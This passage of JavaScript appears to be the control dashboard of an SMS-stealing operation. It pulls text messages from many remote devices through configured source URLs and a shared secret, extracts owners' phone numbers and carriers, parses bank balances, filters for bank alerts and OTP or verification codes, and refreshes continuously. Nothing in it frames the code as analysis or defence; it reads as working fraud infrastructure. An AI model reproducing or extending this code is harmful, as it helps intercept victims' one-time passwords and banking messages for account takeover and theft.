  const toDo = devices.filter(d=>{
    const k = cacheKey(d);
    const needPhone = !phoneCache[k];
    return needPhone && d._srcUrl && d._srcSec;
  });
  if(toDo.length===0){ savePhoneCache(); enrichRunning=false; return; }

  let CONC = 20, idx = 0, running = 0;
  await new Promise(resolve=>{
    function tryFinish(){ if(idx>=toDo.length && running===0) resolve(); }
    function launch(){
      while(running<CONC && idx<toDo.length){
        const dev = toDo[idx++];
        running++;
        fetchSmsRaw(dev.id, dev._srcUrl, dev._srcSec)
          .then(msgs=>{
            let phone=null, network=null;
            for(const m of msgs){
              if(!phone) phone = extractPhoneFromSmsText(m.text);
              if(!network){ const nm = m.text.match(/Jio|Airtel|Vodafone|Idea|BSNL|Vi\b/); if(nm) network = nm[0]; }
            }
            const entry = phoneCache[cacheKey(dev)] || {phone, network};
            if(!phone && !network) entry.empty = true;
            phoneCache[cacheKey(dev)] = entry;
            if(phone) dev.mobNo = phone;
            if(network) dev.network = network;
            const sd = analyzeSms(msgs);
            if(sd.bankBalances.length>0) dev.sms.bankBalances = sd.bankBalances;
            if(sd.networks.length>0) dev.sms.networks = sd.networks;
            updateCardInDom(dev);
          })
          .catch(()=>{})
          .finally(()=>{
            running--;
            if((toDo.length-idx)%20===0){ savePhoneCache(); setTimeout(launch,0); } else { launch(); }
          });
      }
      tryFinish();
    }
    launch();
  });

  savePhoneCache();
  enrichRunning = false;
}

function abortSmsFetch(){
  if(smsAbort){ try{ smsAbort.abort(); }catch(e){} smsAbort = null; }
  smsFetchRunning = false;
}

async function fetchAllSmsFromDevices(showProgress){
  if(smsFetchRunning) return;
  if(devices.length===0){ renderAllSms(); return; }
  smsFetchRunning = true;
  smsAbort = new AbortController();
  const signal = smsAbort.signal;
  const total = devices.length;
  let done = 0, queueIdx = 0;
  const CONC = 20;
  let changed = false;

  const barEl = document.getElementById('smsProgBar');
  const lblEl = document.getElementById('smsProgLbl');
  const progEl = document.getElementById('smsProg');
  if(showProgress && progEl){ progEl.classList.add('show'); if(barEl) barEl.style.width='0%'; if(lblEl) lblEl.textContent = `Scanning 0 / ${total}...`; }

  await new Promise(resolve=>{
    let running = 0, finished = false;
    function tryFinish(){ if(queueIdx>=total && running===0 && !finished){ finished=true; resolve(); } }
    function launch(){
      if(signal.aborted){ tryFinish(); return; }
      while(running<CONC && queueIdx<total){ const d = devices[queueIdx++]; running++; process(d); }
      tryFinish();
    }
    function process(dev){
      fetchSmsRaw(dev.id, dev._srcUrl, dev._srcSec, signal)
        .then(msgs=>{
          if(msgs && msgs.length>0){
            const k = dkey(dev);
            const prev = allSmsCache[k];
            let ch = false;
            if(!prev) ch = true;
            else if(prev.length !== msgs.length) ch = true;
            else if(prev[0] && msgs[0] && (prev[0]._ts !== msgs[0]._ts || prev[0].text !== msgs[0].text)) ch = true;
            if(ch){ allSmsCache[k] = msgs; changed = true; }
          }
        })
        .catch(e=>{})
        .finally(()=>{
          running--; done++;
          if(showProgress && (done%10===0 || done===total)){
            const pct = Math.round((done/total)*100);
            if(barEl) barEl.style.width = pct+'%';
            if(lblEl) lblEl.textContent = `Scanning ${done} / ${total} (${pct}%)`;
          }
          if(signal.aborted){ tryFinish(); return; }
          launch();
        });
    }
    launch();
  });

  smsFetchRunning = false; smsAbort = null;
  if(barEl) barEl.style.width = '100%';
  if(lblEl) lblEl.textContent = `Complete · ${total} devices`;
  setTimeout(()=>{ if(progEl) progEl.classList.remove('show'); }, 700);
  if(changed){ saveAllSmsCache(); updateAllSmsBadge(); renderAllSms(); }
}

function startSmsLive(){
  stopSmsLive();
  smsHashLast = smsHash();
  smsLiveInt = setInterval(()=>{
    if(!document.getElementById('smsList')){ stopSmsLive(); return; }
    if(document.hidden) return;
    const h = smsHash();
    if(h !== smsHashLast){
      smsHashLast = h;
      const listEl = document.getElementById('smsList');
      if(listEl && listEl.scrollTop<200) renderAllSms(true);
      else updateCount();
    }
    if(!smsFetchRunning) fetchAllSmsFromDevices(false);
  }, 3000);
}
function stopSmsLive(){ if(smsLiveInt){ clearInterval(smsLiveInt); smsLiveInt=null; } }
function smsHash(){
  let h = '';
  for(const k in allSmsCache){
    const msgs = allSmsCache[k];
    h += k+':'+(msgs?msgs.length:0)+':';
    if(msgs && msgs[0]) h += msgs[0]._ts || 0;
    h += ';';
  }
  return h;
}

function buildFiltered(){
  const devMap = {};
  for(const d of devices) devMap[dkey(d)] = d;
  const out = [];
  for(const k in allSmsCache){
    const msgs = allSmsCache[k];
    if(!msgs || !msgs.length) continue;
    const dev = devMap[k];
    const devName = dev ? dev.name : (k.split('::')[0]||'Unknown');
    const devPhone = dev ? (dev.mobNo && dev.mobNo !== '—' ? dev.mobNo : '') : '';
    for(const msg of msgs){
      const t = msg.text||'';
      if(allSmsFilter==='bank' && !/(?:avl|bal|available|balance|debited|credited|withdrawn|deposited|spent|inr|rs\.?|₹|hdfc|sbi|icici|axis|kotak|pnb|paytm|phonepe|gpay)/i.test(t)) continue;
      if(allSmsFilter==='otp' && !/(?:otp|code|verification|verify|pin is|password)/i.test(t)) continue;
      out.push({devName, devPhone, msg, _date: fmtDate(msg._ts)});
    }
  }
  out.sort((a,b)=>{
    const ta = a.msg._ts||0, tb = b.msg._ts||0;
    if(tb!==ta) return tb-ta;
    return String(b.msg._key||'').localeCompare(String(a.msg._key||''));
  });
  return out;
}

function updateCount(){
  const el = document.getElementById('smsCount');
  if(el) el.textContent = `${smsFilteredList.length} messages · ${Object.keys(allSmsCache).length} devices`;
}

function renderAllSms(preserveScroll){
  const listEl = document.getElementById('smsList');
  if(!listEl) return;
  const prevScroll = preserveScroll ? listEl.scrollTop : 0;
  smsFilteredList = buildFiltered();
  smsRenderedCount = 0;
  updateCount();
  if(smsFilteredList.length===0){
    listEl.innerHTML = '<div class="empty"><div class="t">No messages</div><div class="s">No SMS available</div></div>';
    const foot = document.getElementById('smsFoot');
    if(foot) foot.textContent = '';
    return;
  }
  listEl.innerHTML = '';
  appendChunk(); appendChunk(); appendChunk();
  setupScroll(listEl);
  if(preserveScroll && prevScroll>0) listEl.scrollTop = prevScroll;
}

function appendChunk(){
  const listEl = document.getElementById('smsList');
  if(!listEl || smsRenderedCount>=smsFilteredList.length) return;
  const end = Math.min(smsRenderedCount+SMS_CHUNK, smsFilteredList.length);
  let lastDate = smsRenderedCount>0 ? (smsFilteredList[smsRenderedCount-1]._date||'') : '';
  let html = '';
  for(let i=smsRenderedCount; i<end; i++){
    const x = smsFilteredList[i];
    if(x._date !== lastDate){ html += `<div class="sms-date">${esc(x._date)}</div>`; lastDate = x._date; }
    html += `<div class="sms-item">
      <div class="head"><span>${esc(x.devName.substring(0,24))}${x.devPhone?' · '+esc(x.devPhone):''}</span><span class="time">${esc(x.msg.time||'')}</span></div>
      <div class="from">From: ${esc(x.msg.sender||'Unknown')}</div>
      <div class="body">${esc(x.msg.text||'')}</div>
    </div>`;
  }
  listEl.insertAdjacentHTML('beforeend', html);
  smsRenderedCount = end;
  updateFoot();
}

function updateFoot(){
  const foot = document.getElementById('smsFoot');
  if(!foot) return;
  const total = smsFilteredList.length, shown = smsRenderedCount;
  if(shown>=total){ foot.innerHTML = `All <b>${total}</b> messages loaded`; }
  else { foot.innerHTML = `Showing <b>${shown}</b> of <b>${total}</b> — scroll for more`; }
}

function setupScroll(listEl){
  if(smsScrollHandler && smsListEl) smsListEl.removeEventListener('scroll', smsScrollHandler);
  smsListEl = listEl;
  smsScrollHandler = ()=>{
    if(smsRenderedCount>=smsFilteredList.length) return;
    const remaining = listEl.scrollHeight - listEl.scrollTop - listEl.clientHeight;
    if(remaining<800) appendChunk();
  };
  listEl.addEventListener('scroll', smsScrollHandler, {passive:true});
}

function closeModal(){
  stopSmsLive();
  abortSmsFetch();
  if(smsScrollHandler && smsListEl){ smsListEl.removeEventListener('scroll', smsScrollHandler); smsScrollHandler=null; smsListEl=null; }
  smsFilteredList = [];
  smsRenderedCount = 0;
  document.getElementById('modalRoot').innerHTML = '';
}

// ============ BOOT ============
async function bootApp(){
  blacklist = loadBL();
  stars = loadStars();
  loadPhoneCache();
  loadAllSmsCache();
  currentFilter = 'all';
  currentSort = 'newest';
  searchQ = '';
  showHidden = false;
  selectedDevice = null;
  devices = [];
  lastStatsSig = '';

  setupGridClick();
  setupEvents();

  // Fetch config from Firebase
  try{
    const snap = await get(ref(db, 'config/sources'));
    const data = snap.val();
    let urls = [];
    if(data){
      if(Array.isArray(data)) urls = data;
      else if(typeof data === 'object') urls = Object.values(data);
    }
    if(urls.length>0){
      sources = urls.map((u,i)=>({id:'SRC-'+(1000+i), url:u, secret:NODE_SECRET, tag:makeTag(u)}));
    } else {
      sources = FALLBACK_URLS.map((u,i)=>({id:'SRC-'+(1000+i), url:u, secret:NODE_SECRET, tag:makeTag(u)}));
    }
  }catch(e){
    console.error('Config fetch failed:', e);
    sources = FALLBACK_URLS.map((u,i)=>({id:'SRC-'+(1000+i), url:u, secret:NODE_SECRET, tag:makeTag(u)}));
  }

  // Live config watch
  try{
    if(configUnsubscribe) configUnsubscribe();
    configUnsubscribe = onValue(ref(db, 'config/sources'), (snap)=>{
      const data = snap.val();
      let urls = [];
      if(data){
        if(Array.isArray(data)) urls = data;
        else if(typeof data === 'object') urls = Object.values(data);
      }
      if(urls.length>0){
        const newSrc = urls.map((u,i)=>({id:'SRC-'+(1000+i), url:u, secret:NODE_SECRET, tag:makeTag(u)}));
        const sig = newSrc.map(s=>s.url).join('|');
        const oldSig = sources.map(s=>s.url).join('|');
        if(sig !== oldSig){ sources = newSrc; fetchAll(true); }
      }
    });
  }catch(e){}

  // Initial fetch - immediate
  fetchAll(false);

  // Regular refresh every 15s
  if(fetchInt) clearInterval(fetchInt);
  fetchInt = setInterval(()=>{ if(!document.hidden) fetchAll(true); }, 15000);

  updateAllSmsBadge();
  updateStarredBadge();
}

function setupEvents(){
  document.getElementById('filterbar').onclick = (e)=>{
    const b = e.target.closest('button[data-f]');
    if(!b) return;
    document.querySelectorAll('#filterbar button[data-f]').forEach(x=>x.classList.remove('active'));
    b.classList.add('active');
    currentFilter = b.getAttribute('data-f');
    renderSections();
  };
  document.getElementById('sortSel').onchange = (e)=>{ currentSort = e.target.value; renderSections(); };
  let searchTimer;
  document.getElementById('searchInput').oninput = (e)=>{
    const v = e.target.value;
    clearTimeout(searchTimer);
    searchTimer = setTimeout(()=>{ searchQ = v.trim(); renderSections(); }, 300);
  };
  document.getElementById('refreshBtn').onclick = ()=>{ fetchAll(false); toast('Refreshing…','warn'); };
  document.getElementById('allSmsBtn').onclick = openAllSmsModal;
  document.getElementById('starredBtn').onclick = ()=>{
    currentFilter = 'starred';
    document.querySelectorAll('#filterbar button[data-f]').forEach(x=>x.classList.remove('active'));
    renderSections();
    toast('Showing starred','warn');
  };
  document.getElementById('hiddenBtn').onclick = function(){
    showHidden = !showHidden;
    this.style.color = showHidden ? 'var(--warning)' : '';
    this.style.borderColor = showHidden ? 'var(--warning)' : '';
    renderSections();
    toast(showHidden?'Showing hidden':'Hidden filtered','warn');
  };
  document.getElementById('disconnectBtn').onclick = ()=>{
    if(!confirm('Clear all cache and reload?')) return;
    localStorage.clear(); sessionStorage.clear();
    if(configUnsubscribe) configUnsubscribe();
    window.location.reload();
  };
}

document.addEventListener('visibilitychange', ()=>{
  if(document.hidden){
    stopSmsLive();
    abortSmsFetch();
    if(fetchInt){ clearInterval(fetchInt); fetchInt=null; }
    if(detailSmsInt){ clearInterval(detailSmsInt); detailSmsInt=null; }
  } else {
    if(document.getElementById('app').classList.contains('ready')){
      if(!fetchInt){ fetchInt = setInterval(()=>{ if(!document.hidden) fetchAll(true); }, 15000); }
      if(document.getElementById('smsList')) startSmsLive();
      if(selectedDevice && !detailSmsInt){
        detailSmsInt = setInterval(()=>{
          if(document.hidden) return;
          if(!selectedDevice || !selectedDevice._srcUrl) return;
          if(detailTab==='send') return;
          fetchSms(selectedDevice.id, selectedDevice._srcUrl, selectedDevice._srcSec).then(()=>{
            if(smsMsgs.length>0){ allSmsCache[dkey(selectedDevice)] = smsMsgs; saveAllSmsCache(); updateAllSmsBadge(); }
            renderDetailContent();
          });
        }, 2000);
      }
    }
  }
});
